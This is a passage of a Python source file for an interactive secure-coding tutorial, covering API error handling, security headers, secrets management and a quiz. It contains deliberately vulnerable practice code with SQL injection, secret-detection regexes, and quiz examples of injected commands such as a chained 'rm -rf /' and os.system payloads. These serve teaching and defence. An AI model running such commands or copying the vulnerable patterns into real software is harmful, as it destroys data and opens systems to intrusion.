        '@app.after_request\n'
        'def add_cors_headers(response):\n'
        '    origin = request.headers.get("Origin")\n'
        '    if origin in ALLOWED_ORIGINS:\n'
        '        response.headers["Access-Control-Allow-Origin"] = origin\n'
        '        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"\n'
        '        response.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"\n'
        '        response.headers["Access-Control-Max-Age"] = "3600"\n'
        '    return response',
        "python"
    )

    pace()

    press_enter()

    # --- Error handling ---
    sub_header("4. Error Handling That Does Not Leak Information")

    lesson_block(
        "Error messages are a gold mine for attackers. A stack trace reveals "
        "file paths, library versions, and internal logic."
    )

    lesson_block(
        "A detailed SQL error reveals table names and column structures. "
        "Your API must return generic error messages to clients while "
        "logging full details internally."
    )

    pace()

    info("DANGEROUS error handling:")
    code_block(
        '@app.route("/user/<int:user_id>")\n'
        'def get_user(user_id):\n'
        '    try:\n'
        '        user = db.query(f"SELECT * FROM users WHERE id={user_id}")\n'
        '        return jsonify(user)\n'
        '    except Exception as e:\n'
        '        # NEVER return raw exception details to the client!\n'
        '        return jsonify({"error": str(e)}), 500\n'
        '        # Attacker sees:\n'
        '        # "error": "relation \\"users\\" column \\"password_hash\\" ...',
        "python"
    )

    pace()

    info("SAFE error handling:")
    code_block(
        'import logging\n'
        'import uuid\n'
        '\n'
        'logger = logging.getLogger("api")\n'
        '\n'
        '@app.errorhandler(Exception)\n'
        'def handle_error(e):\n'
        '    # Generate a unique error ID for correlation\n'
        '    error_id = str(uuid.uuid4())[:8]\n'
        '    # Log full details internally\n'
        '    logger.error(f"Error {error_id}: {e}", exc_info=True)\n'
        '    # Return GENERIC message to client\n'
        '    return jsonify({\n'
        '        "error": "An internal error occurred",\n'
        '        "error_id": error_id,  # so support can look it up\n'
        '    }), 500',
        "python"
    )

    pace()

    code_block(
        '# Specific error handlers for expected cases\n'
        '@app.errorhandler(404)\n'
        'def not_found(e):\n'
        '    return jsonify({"error": "Resource not found"}), 404\n'
        '\n'
        '@app.errorhandler(400)\n'
        'def bad_request(e):\n'
        '    return jsonify({"error": "Bad request"}), 400',
        "python"
    )

    pace()

    tip("Always give the client a unique error_id so support can find the full details in the logs.")

    press_enter()

    # --- HTTPS ---
    sub_header("5. HTTPS Enforcement")

    lesson_block(
        "EVERY API must be served over HTTPS. HTTP transmits data in "
        "plaintext, which means anyone on the network path can read API "
        "keys, session tokens, and user data."
    )

    pace()

    code_block(
        '@app.after_request\n'
        'def security_headers(response):\n'
        '    # Force HTTPS\n'
        '    response.headers["Strict-Transport-Security"] = (\n'
        '        "max-age=31536000; includeSubDomains"\n'
        '    )\n'
        '    # Prevent MIME type sniffing\n'
        '    response.headers["X-Content-Type-Options"] = "nosniff"\n'
        '    # Prevent clickjacking\n'
        '    response.headers["X-Frame-Options"] = "DENY"\n'
        '    # Content Security Policy\n'
        '    response.headers["Content-Security-Policy"] = (\n'
        '        "default-src \'self\'"\n'
        '    )\n'
        '    # Disable caching for API responses with sensitive data\n'
        '    response.headers["Cache-Control"] = (\n'
        '        "no-store, no-cache, must-revalidate"\n'
        '    )\n'
        '    return response',
        "python"
    )

    pace()

    nice_work("You have covered all five pillars of secure API design!")

    press_enter()

    why_it_matters(
        "APIs are responsible for the majority of data breaches in modern "
        "companies. OWASP maintains a dedicated API Security Top 10 list. "
        "Common API vulnerabilities include broken authentication, excessive "
        "data exposure, lack of rate limiting, and broken function-level "
        "authorization. Getting these basics right prevents most attacks."
    )

    pace()

    scenario_block(
        "The Verbose Error Message",
        "A healthcare API returned detailed PostgreSQL error messages when "
        "queries failed. An attacker deliberately sent malformed requests and "
        "collected error messages that revealed table names (patients, "
        "prescriptions, insurance_claims), column names (ssn, diagnosis_code), "
        "and even PostgreSQL version info. Using this information, they crafted "
        "a precision SQL injection attack that extracted 500,000 patient records. "
        "After the breach, the company replaced all detailed error responses "
        "with generic messages and error IDs."
    )

    press_enter()

    # --- Practice challenge ---
    sub_header("Practice Challenge: Secure This API Endpoint")

    lesson_block(
        "The following API endpoint has at least FIVE security problems. "
        "Identify each one:"
    )

    code_block(
        '@app.route("/api/users", methods=["GET", "POST", "DELETE"])\n'
        'def users_endpoint():\n'
        '    if request.method == "GET":\n'
        '        # Return all users including password hashes\n'
        '        users = db.query("SELECT * FROM users")\n'
        '        return jsonify(users)\n'
        '    elif request.method == "POST":\n'
        '        data = request.json\n'
        '        name = data["name"]\n'
        '        db.execute(f"INSERT INTO users (name) VALUES (\'{name}\')")\n'
        '        return jsonify({"status": "created"})\n'
        '    elif request.method == "DELETE":\n'
        '        user_id = request.args.get("id")\n'
        '        db.execute(f"DELETE FROM users WHERE id={user_id}")\n'
        '        return jsonify({"status": "deleted"})',
        "python"
    )

    hint_text(
        "Think about: authentication, authorization, data exposure, "
        "SQL injection, input validation, rate limiting..."
    )

    if ask_yes_no("Ready to see the answer?"):
        success("Security problems found:")
        print(f"    {R}1. No authentication{RESET}")
        print(f"       Anyone can call this endpoint. Add @require_api_key or JWT auth.")
        print()
        print(f"    {R}2. No authorization{RESET}")
        print(f"       Any authenticated user can DELETE any other user. Check roles/ownership.")
        print()
        print(f"    {R}3. Excessive data exposure{RESET}")
        print(f"       SELECT * returns password hashes. Only return needed fields.")
        print()
        print(f"    {R}4. SQL injection (x2){RESET}")
        print(f"       Both INSERT and DELETE use string formatting. Use parameterized queries.")
        print()
        print(f"    {R}5. No input validation{RESET}")
        print(f"       The 'name' and 'id' fields are used without any type or format checking.")
        print()
        print(f"    {R}6. No rate limiting{RESET}")
        print(f"       Attackers can brute-force or spam this endpoint with no throttling.")
        mark_challenge_complete(progress, "module8", "secure_api_challenge")

    mark_lesson_complete(progress, "module8", "secure_api")
    success("Lesson 3 complete: Secure API Design")
    press_enter()


# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  Lesson 4 — Secrets Management                                          ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

def _lesson_secrets_management(progress):
    """Lesson 4: Secrets Management."""
    section_header("Lesson 4: Secrets Management")

    learning_goal([
        "Recognize common secrets management mistakes",
        "Use environment variables and .env files safely",
        "Understand dedicated secret managers (AWS, Vault)",
        "Prevent accidental secret commits with pre-commit hooks",
    ])

    pace()

    lesson_block(
        "Secrets -- API keys, database passwords, JWT signing keys, "
        "encryption keys -- are the crown jewels of your application."
    )

    lesson_block(
        "If an attacker obtains them, they have the same access as your "
        "application. This lesson covers how to handle secrets correctly."
    )

    pace()

    # --- What NOT to do ---
    sub_header("What NOT to Do: The Hall of Shame")

    warning("These are all real patterns found in production codebases:")

    code_block(
        '# CRIME 1: Hardcoded secrets in source code\n'
        'DB_PASSWORD = "SuperSecret123!"\n'
        'API_KEY = "sk-live-a1b2c3d4e5f6g7h8i9j0"\n'
        'JWT_SECRET = "my-jwt-secret"\n'
        '\n'
        '# CRIME 2: Secrets in comments or documentation\n'
        '# To connect: mysql -u root -p \'R00tP@ssw0rd!\'\n'
        '\n'
        '# CRIME 3: Secrets in git history\n'
        '# Even if you delete the line, git remembers EVERYTHING\n'
        '# $ git log -p | grep -i password',
        "python"
    )

    pace()

    code_block(
        '# CRIME 4: Secrets in Docker images\n'
        '# ENV DB_PASSWORD=SuperSecret123!  # in Dockerfile\n'
        '# COPY .env /app/.env             # includes secrets\n'
        '\n'
        '# CRIME 5: Secrets in log output\n'
        'logger.info(f"Connecting to DB with password {db_password}")\n'
        '\n'
        '# CRIME 6: Secrets shared via Slack/email\n'
        '# "Hey, the prod database password is ..."',
        "python"
    )

    pace()

    warning(
        "In 2024, researchers found over 10 million secrets exposed in public "
        "GitHub repositories, including AWS keys, database passwords, and "
        "private SSH keys."
    )

    pace()

    tip("If a secret has ever been committed to git, consider it compromised and rotate it immediately.")

    press_enter()

    # --- Environment variables ---
    sub_header("Level 1: Environment Variables")

    lesson_block(
        "The simplest improvement over hardcoded secrets is to load them "
        "from environment variables. The application code never contains "
        "the secret value, only a reference to the variable name."
    )

    pace()

    code_block(
        'import os\n'
        '\n'
        'def get_required_env(name):\n'
        '    """Get an environment variable or fail loudly."""\n'
        '    value = os.environ.get(name)\n'
        '    if value is None:\n'
        '        raise RuntimeError(\n'
        '            f"Required environment variable {name} is not set. "\n'
        '            f"Check your .env file or deployment configuration."\n'
        '        )\n'
        '    return value\n'
        '\n'
        '# Usage\n'
        'DB_HOST = get_required_env("DB_HOST")\n'
        'DB_PASSWORD = get_required_env("DB_PASSWORD")\n'
        'JWT_SECRET = get_required_env("JWT_SECRET")\n'
        'API_KEY = get_required_env("STRIPE_API_KEY")',
        "python"
    )

    pace()

    lesson_block(
        "Pros: Simple, universally supported, keeps secrets out of code."
    )

    lesson_block(
        "Cons: Environment variables can leak via /proc/self/environ, error "
        "messages, child processes, and crash dumps. They are unencrypted "
        "in memory and not audited."
    )

    pace()

    press_enter()

    # --- .env files ---
    sub_header("Level 2: .env Files with python-dotenv")

    lesson_block(
        "For local development, a .env file stores secrets outside of "
        "source code. The python-dotenv library loads these into environment "
        "variables at startup."
    )

    tip("CRITICAL: the .env file must be in .gitignore!")

    pace()

    code_block(
        '# .env file (NEVER commit this to git!)\n'
        'DB_HOST=localhost\n'
        'DB_PORT=5432\n'
        'DB_NAME=myapp\n'
        'DB_USER=myapp_user\n'
        'DB_PASSWORD=local-dev-password-only\n'
        'JWT_SECRET=local-dev-jwt-secret\n'
        'STRIPE_API_KEY=sk-test-local-key',
        "env"
    )

    pace()

    code_block(
        '# app.py\n'
        'from dotenv import load_dotenv\n'
        'import os\n'
        '\n'
        '# Load .env file into environment (only for local development)\n'
        'load_dotenv()\n'
        '\n'
        '# Now os.environ contains the values from .env\n'
        'DB_PASSWORD = os.environ["DB_PASSWORD"]',
        "python"
    )

    pace()

    code_block(
        '# .gitignore — ESSENTIAL lines for secrets\n'
        '.env\n'
        '.env.local\n'
        '.env.production\n'
        '*.pem\n'
        '*.key\n'
        'credentials.json\n'
        'secrets.yaml\n'
        'service-account-key.json',
        "gitignore"
    )

    pace()

    nice_work("Environment variables and .env files handle most development scenarios!")

    press_enter()

    # --- Secret managers ---
    sub_header("Level 3: Dedicated Secret Managers")

    lesson_block(
        "For production systems, dedicated secret managers provide encryption "
        "at rest, access control, audit logging, and automatic rotation."
    )

    lesson_block(
        "The major cloud providers each offer one, and HashiCorp Vault is "
        "the popular self-hosted option."
    )

    pace()

    code_block(
        '# AWS Secrets Manager\n'
        'import boto3\n'
        'import json\n'
        '\n'
        'def get_aws_secret(secret_name, region="us-east-1"):\n'
        '    """Retrieve a secret from AWS Secrets Manager."""\n'
        '    client = boto3.client("secretsmanager", region_name=region)\n'
        '    response = client.get_secret_value(SecretId=secret_name)\n'
        '    return json.loads(response["SecretString"])\n'
        '\n'
        '# Usage:\n'
        '# db_creds = get_aws_secret("prod/database/credentials")\n'
        '# DB_PASSWORD = db_creds["password"]',
        "python"
    )

    pace()

    code_block(
        '# Google Cloud Secret Manager\n'
        'from google.cloud import secretmanager\n'
        '\n'
        'def get_gcp_secret(project_id, secret_name, version="latest"):\n'
        '    """Retrieve a secret from GCP Secret Manager."""\n'
        '    client = secretmanager.SecretManagerServiceClient()\n'
        '    name = f"projects/{project_id}/secrets/{secret_name}/versions/{version}"\n'
        '    response = client.access_secret_version(name=name)\n'
        '    return response.payload.data.decode("UTF-8")',
        "python"
    )

    pace()

    code_block(
        '# HashiCorp Vault\n'
        'import hvac\n'
        '\n'
        'def get_vault_secret(path, vault_url="https://vault.internal:8200"):\n'
        '    """Retrieve a secret from HashiCorp Vault."""\n'
        '    client = hvac.Client(url=vault_url)\n'
        '    # Authenticate (many methods available)\n'
        '    client.auth.kubernetes.login(role="app-role",\n'
        '                                 jwt=open("/var/run/secrets/token").read())\n'
        '    result = client.secrets.kv.v2.read_secret_version(path=path)\n'
        '    return result["data"]["data"]',
        "python"
    )

    pace()

    press_enter()

    # --- Key rotation ---
    sub_header("Key Rotation")

    lesson_block(
        "Secrets should be rotated (replaced with new values) on a regular "
        "schedule and immediately after any suspected compromise."
    )

    lesson_block(
        "Rotation limits the damage if a secret is leaked -- an old secret "
        "that has been rotated is useless to an attacker."
    )

    pace()

    code_block(
        '"""key_rotation.py — Pattern for zero-downtime key rotation."""\n'
        '\n'
        'import os\n'
        'import time\n'
        '\n'
        'class RotatingSecret:\n'
        '    """Support two active keys during rotation transitions.\n'
        '\n'
        '    During rotation:\n'
        '    1. Generate new key, add as SECONDARY\n'
        '    2. Update all services to accept both PRIMARY and SECONDARY\n'
        '    3. Promote SECONDARY to PRIMARY\n'
        '    4. Retire old PRIMARY after a grace period\n'
        '    """\n'
        '\n'
        '    def __init__(self, primary_env, secondary_env=None):\n'
        '        self.primary = os.environ[primary_env]\n'
        '        self.secondary = os.environ.get(\n'
        '            secondary_env or f"{primary_env}_PREVIOUS", ""\n'
        '        )',
        "python"
    )

    pace()

    code_block(
        '    def verify(self, token, verify_func):\n'
        '        """Try to verify with primary key, fall back to secondary."""\n'
        '        try:\n'
        '            return verify_func(token, self.primary)\n'
        '        except Exception:\n'
        '            if self.secondary:\n'
        '                return verify_func(token, self.secondary)\n'
        '            raise\n'
        '\n'
        '# Rotation schedule recommendations:\n'
        '# - API keys: every 90 days\n'
        '# - Database passwords: every 90 days\n'
        '# - JWT signing keys: every 30 days\n'
        '# - Encryption keys: every 365 days\n'
        '# - After any security incident: IMMEDIATELY',
        "python"
    )

    pace()

    nice_work("Key rotation is an advanced topic, and you just nailed it!")

    press_enter()

    # --- Secure config loader ---
    sub_header("Building a Secure Config Loader")

    lesson_block(
        "Here is a production-quality configuration loader that supports "
        "multiple secret sources, validates required settings, and prevents "
        "accidental secret exposure."
    )

    pace()

    code_block(
        '"""secure_config.py — Centralized, secure configuration loader."""\n'
        '\n'
        'import os\n'
        'import json\n'
        'import logging\n'
        'from pathlib import Path\n'
        'from dataclasses import dataclass, field\n'
        '\n'
        'logger = logging.getLogger(__name__)\n'
        '\n'
        '@dataclass\n'
        'class AppConfig:\n'
        '    """Application configuration with secure defaults."""\n'
        '    db_host: str = "localhost"\n'
        '    db_port: int = 5432\n'
        '    db_name: str = ""\n'
        '    db_user: str = ""\n'
        '    db_password: str = ""     # loaded from env/secret manager\n'
        '    jwt_secret: str = ""      # loaded from env/secret manager\n'
        '    api_key: str = ""         # loaded from env/secret manager\n'
        '    debug: bool = False\n'
        '    allowed_origins: list = field(default_factory=list)',
        "python"
    )

    pace()

    code_block(
        '    # Mark which fields are secrets (for safe logging)\n'
        '    SECRET_FIELDS = {"db_password", "jwt_secret", "api_key"}\n'
        '\n'
        '    def safe_dict(self):\n'
        '        """Return config dict with secrets masked."""\n'
        '        result = {}\n'
        '        for k, v in self.__dict__.items():\n'
        '            if k.startswith("_"):\n'
        '                continue\n'
        '            if k in self.SECRET_FIELDS:\n'
        '                result[k] = "***REDACTED***" if v else "(not set)"\n'
        '            else:\n'
        '                result[k] = v\n'
        '        return result\n'
        '\n'
        '    def __repr__(self):\n'
        '        """Never accidentally log secrets."""\n'
        '        return f"AppConfig({self.safe_dict()})"',
        "python"
    )

    pace()

    tip("The safe_dict() pattern prevents secrets from appearing in logs or error messages.")

    code_block(
        'def load_config() -> AppConfig:\n'
        '    """Load configuration from environment variables.\n'
        '\n'
        '    Priority: env vars > .env file > defaults\n'
        '    """\n'
        '    config = AppConfig(\n'
        '        db_host=os.environ.get("DB_HOST", "localhost"),\n'
        '        db_port=int(os.environ.get("DB_PORT", "5432")),\n'
        '        db_name=os.environ.get("DB_NAME", ""),\n'
        '        db_user=os.environ.get("DB_USER", ""),\n'
        '        db_password=os.environ.get("DB_PASSWORD", ""),\n'
        '        jwt_secret=os.environ.get("JWT_SECRET", ""),\n'
        '        api_key=os.environ.get("API_KEY", ""),\n'
        '        debug=os.environ.get("DEBUG", "false").lower() == "true",\n'
        '    )\n'
        '\n'
        '    # Validate required settings\n'
        '    missing = []\n'
        '    for field_name in AppConfig.SECRET_FIELDS:\n'
        '        if not getattr(config, field_name):\n'
        '            missing.append(field_name)\n'
        '    if missing and not config.debug:\n'
        '        raise RuntimeError(\n'
        '            f"Missing required secrets: {missing}. "\n'
        '            f"Set them as environment variables."\n'
        '        )\n'
        '\n'
        '    logger.info(f"Configuration loaded: {config.safe_dict()}")\n'
        '    return config',
        "python"
    )

    pace()

    press_enter()

    # --- Pre-commit hooks ---
    sub_header("Preventing Accidental Secret Commits")

    lesson_block(
        "Even with .gitignore, developers sometimes accidentally commit "
        "secrets in code files. Pre-commit hooks and scanning tools catch "
        "this before the secret reaches the repository."
    )

    pace()

    code_block(
        '# .pre-commit-config.yaml\n'
        'repos:\n'
        '  - repo: https://github.com/Yelp/detect-secrets\n'
        '    rev: v1.4.0\n'
        '    hooks:\n'
        '      - id: detect-secrets\n'
        '        args: ["--baseline", ".secrets.baseline"]\n'
        '\n'
        '  - repo: https://github.com/zricethezav/gitleaks\n'
        '    rev: v8.18.0\n'
        '    hooks:\n'
        '      - id: gitleaks\n'
        '\n'
        '# Setup:\n'
        '# pip install pre-commit\n'
        '# pre-commit install\n'
        '# pre-commit run --all-files  # scan existing code',
        "yaml"
    )

    pace()

    code_block(
        '# Simple custom pre-commit hook: .git/hooks/pre-commit\n'
        '#!/bin/bash\n'
        '# Prevent committing files that might contain secrets\n'
        '\n'
        'PATTERNS=(\n'
        '    "password\\s*=\\s*[\\"\\x27][^\\"\\x27]+[\\"\\x27]"\n'
        '    "api[_-]?key\\s*=\\s*[\\"\\x27][^\\"\\x27]+[\\"\\x27]"\n'
        '    "secret\\s*=\\s*[\\"\\x27][^\\"\\x27]+[\\"\\x27]"\n'
        '    "AKIA[0-9A-Z]{16}"  # AWS access key pattern\n'
        '    "-----BEGIN (RSA |EC )?PRIVATE KEY-----"\n'
        ')',
        "bash"
    )

    pace()

    code_block(
        'for pattern in "${PATTERNS[@]}"; do\n'
        '    if git diff --cached | grep -iE "$pattern" > /dev/null; then\n'
        '        echo "ERROR: Possible secret detected in staged files!"\n'
        '        echo "Pattern: $pattern"\n'
        '        echo "Run: git diff --cached | grep -iE \'$pattern\' to see matches"\n'
        '        exit 1\n'
        '    fi\n'
        'done',
        "bash"
    )

    pace()

    press_enter()

    why_it_matters(
        "Secret exposure is one of the fastest paths from 'minor misconfiguration' "
        "to 'catastrophic data breach.' When secrets are committed to a public "
        "repository, automated bots detect and exploit them within minutes."
    )

    pace()

    tip(
        "Even in private repositories, any developer, contractor, or compromised "
        "CI system with read access can harvest secrets. Proper secrets "
        "management is a non-negotiable requirement for any production system."
    )

    pace()

    scenario_block(
        "The AWS Key in GitHub",
        "A junior developer at a startup pushed a commit containing their AWS "
        "access key and secret to a public GitHub repository. Within 4 minutes, "
        "an automated bot detected the key and spun up 200 high-end EC2 "
        "instances to mine cryptocurrency. By the time the team noticed the "
        "next morning, the AWS bill was $14,000. Amazon waived the charges as "
        "a one-time courtesy, but the company implemented mandatory pre-commit "
        "secret scanning, key rotation policies, and moved all secrets to AWS "
        "Secrets Manager the same week."
    )

    press_enter()

    # --- Practice challenge ---
    sub_header("Practice Challenge: Audit This Configuration")

    lesson_block(
        "Review the following application startup code and identify all the "
        "secrets management violations:"
    )

    code_block(
        '# config.py — loaded at application startup\n'
        'import os\n'
        '\n'
        'DATABASE_URL = "postgresql://admin:Pr0dP@ss!@db.internal:5432/myapp"\n'
        'JWT_SECRET = "change-me-in-production"  # TODO: fix this later\n'
        'STRIPE_KEY = os.environ.get("STRIPE_KEY", "sk-live-real-key-here")\n'
        'DEBUG = True\n'
        '\n'
        'def connect_db():\n'
        '    print(f"Connecting to database: {DATABASE_URL}")\n'
        '    # ...\n'
        '\n'
        '# In Dockerfile:\n'
        '# ENV STRIPE_KEY=sk-live-another-real-key\n'
        '# COPY .env /app/.env',
        "python"
    )

    hint_text(
        "Count all the places where secrets are exposed, defaults are "
        "dangerous, and logging reveals too much..."
    )

    if ask_yes_no("Ready to see the answer?"):
        success("Secrets management violations:")
        print(f"    {R}1. Hardcoded database URL with password{RESET}")
        print(f"       {G}Fix: Load from environment variable, no default.{RESET}")
        print()
        print(f"    {R}2. JWT_SECRET has a weak default value{RESET}")
        print(f"       {G}Fix: No default — require it from env, fail on startup if missing.{RESET}")
        print()
        print(f"    {R}3. STRIPE_KEY has a real key as the fallback default{RESET}")
        print(f"       {G}Fix: No default for production keys. Use get_required_env().{RESET}")
        print()
        print(f"    {R}4. DEBUG = True in what looks like production config{RESET}")
        print(f"       {G}Fix: Default to False; only enable via env var in dev.{RESET}")
        print()
        print(f"    {R}5. print() logs the full DATABASE_URL including password{RESET}")
        print(f"       {G}Fix: Use the safe_dict() pattern to mask secrets in logs.{RESET}")
        print()
        print(f"    {R}6. Dockerfile bakes STRIPE_KEY into the image layer{RESET}")
        print(f"       {G}Fix: Pass secrets at runtime via --env-file, not in Dockerfile.{RESET}")
        print()
        print(f"    {R}7. Dockerfile copies .env into the image{RESET}")
        print(f"       {G}Fix: Add .env to .dockerignore. Never embed secrets in images.{RESET}")
        mark_challenge_complete(progress, "module8", "audit_config_challenge")

    scenario_block("Real-World Breach: Log4Shell / Log4j (2021)", (
        "A critical vulnerability in Apache Log4j (CVE-2021-44228) allowed remote code "
        "execution via a simple log message. Because Log4j was embedded in thousands of "
        "Java applications, the blast radius was enormous — Minecraft servers, iCloud, "
        "Twitter, and Steam were all affected. The root cause: the library performed "
        "JNDI lookups on untrusted input written to logs. Secure coding practices from "
        "this module — input validation, dependency auditing, and never trusting user "
        "input — are the exact defenses against this class of vulnerability."
    ))

    mark_lesson_complete(progress, "module8", "secrets_management")
    success("Lesson 4 complete: Secrets Management")
    press_enter()


# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  Quiz                                                                    ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

MODULE8_QUIZ = [
    {
        "q": "Why is eval() dangerous when used on user input?",
        "options": [
            "A) It is slower than other parsing methods",
            "B) It can execute arbitrary Python code, including system commands",
            "C) It only works with string data types",
            "D) It causes memory leaks",
        ],
        "answer": "b",
        "explanation": (
            "eval() interprets a string as Python code and executes it. "
            "An attacker can pass __import__('os').system('malicious command') "
            "to gain full control of the server."
        ),
    },
    {
        "q": "What is the safe way to load untrusted YAML data in Python?",
        "options": [
            "A) yaml.load(data)",
            "B) yaml.load(data, Loader=yaml.FullLoader)",
            "C) yaml.safe_load(data)",
            "D) yaml.parse(data)",
        ],
        "answer": "c",
        "explanation": (
            "yaml.safe_load() (or yaml.load with Loader=yaml.SafeLoader) only "
            "allows basic Python types and blocks dangerous YAML tags that could "
            "execute arbitrary code."
        ),
    },
    {
        "q": "What is the primary advantage of input WHITELISTING over BLACKLISTING?",
        "options": [
            "A) Whitelisting is faster to implement",
            "B) Whitelisting rejects unknown/unexpected input by default, making bypasses much harder",
            "C) Whitelisting uses less memory",
            "D) Whitelisting works better with Unicode",
        ],
        "answer": "b",
        "explanation": (
            "Blacklists try to block known-bad patterns but attackers constantly "
            "find new bypasses (encoding tricks, case variations, etc.). Whitelists "
            "define exactly what IS allowed and reject everything else — unknown "
            "attack techniques are blocked by default."
        ),
    },
    {
        "q": "Why should API error responses NOT include stack traces or detailed error messages?",
        "options": [
            "A) Stack traces make responses too large",
            "B) They reveal internal implementation details that help attackers plan targeted attacks",
            "C) Stack traces are not valid JSON",
            "D) Detailed errors slow down the API",
        ],
        "answer": "b",
        "explanation": (
            "Detailed error messages reveal file paths, library versions, database "
            "table/column names, and internal logic — all of which help attackers "
            "craft precision attacks. Return generic messages to clients and log "
            "details internally."
        ),
    },
    {
        "q": "Where should production secrets (API keys, database passwords) be stored?",
        "options": [
            "A) In the source code with a comment saying 'change in production'",
            "B) In a .env file committed to the Git repository",
            "C) In environment variables or a dedicated secret manager (AWS Secrets Manager, Vault, etc.)",
            "D) In a shared Google Doc accessible to the team",
        ],
        "answer": "c",
        "explanation": (
            "Secrets should never be in source code or version control. Environment "
            "variables are the minimum standard; dedicated secret managers add "
            "encryption at rest, access control, audit logging, and rotation."
        ),
    },
    {
        "q": "What command injection vulnerability exists in: subprocess.run(f'ping {hostname}', shell=True)?",
        "options": [
            "A) The ping command might not exist on all systems",
            "B) An attacker can append shell commands via the hostname parameter (e.g., '8.8.8.8; rm -rf /')",
            "C) The f-string syntax is invalid Python",
            "D) subprocess.run always requires a list argument",
        ],
        "answer": "b",
        "explanation": (
            "With shell=True, the string is passed to /bin/sh for interpretation. "
            "Special characters like ;, |, &&, and $() allow command chaining. "
            "The fix: use a list ['ping', hostname] without shell=True, and "
            "validate the hostname."
        ),
    },
    {
        "q": "Why is pickle.loads() on untrusted data considered a critical vulnerability?",
        "options": [
            "A) Pickle uses too much memory for large objects",
            "B) Pickle can only deserialize Python 2 objects",
            "C) Unpickling can execute arbitrary code via the __reduce__ method during deserialization",
            "D) Pickle does not support encryption",
        ],
        "answer": "c",
        "explanation": (
            "The pickle protocol calls __reduce__() during deserialization, which "
            "can return arbitrary callable objects. An attacker crafts a pickle "
            "payload where __reduce__ returns os.system('malicious command'), "
            "achieving remote code execution."
        ),
    },
]


# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  Main entry point                                                        ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

def run(progress):
    """Main entry point called from the menu system."""
    module_key = "module8"
    show_case_study("module8")
    while True:
        choice = show_menu("Module 8: Secure Coding Practices", [
            ("python_vulns",        "Lesson 1: Common Python Vulnerabilities"),
            ("input_sanitization",  "Lesson 2: Input Sanitization"),
            ("secure_api",          "Lesson 3: Secure API Design"),
            ("secrets_management",  "Lesson 4: Secrets Management"),
            ("quiz",                "Take the Quiz"),
        ])

        if choice == "back":
            return
        if choice == "quit":
            raise SystemExit

        if choice == "python_vulns":
            _lesson_python_vulns(progress)
        elif choice == "input_sanitization":
            _lesson_input_sanitization(progress)
        elif choice == "secure_api":
            _lesson_secure_api(progress)
        elif choice == "secrets_management":
            _lesson_secrets_management(progress)
        elif choice == "quiz":
            run_quiz(MODULE8_QUIZ, "secure_coding_quiz", module_key, progress)
